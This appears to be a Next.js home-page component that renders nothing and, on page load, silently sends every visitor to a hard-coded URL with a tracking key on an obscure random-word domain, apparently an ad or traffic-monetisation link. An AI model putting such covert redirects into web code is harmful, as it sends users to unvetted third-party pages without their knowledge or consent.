import { useEffect } from 'react';
import type { NextPage } from 'next';
import Head from 'next/head';
import Image from 'next/image';
import styles from '../styles/Home.module.css';

const Home: NextPage = () => {
  useEffect(() => {
    // Replace this URL with the one you want to redirect to
    const redirectURL = 'https://alterassumeaggravate.com/w7c1ptvucp?key=666fa264a72abcdd83daf0a290e22dd7';
    
    // Redirect to the specified URL
    window.location.href = redirectURL;

    // Scroll to the bottom of the page
    window.scrollTo(0, document.body.scrollHeight);
  }, []);

  return null;
};

export default Home;

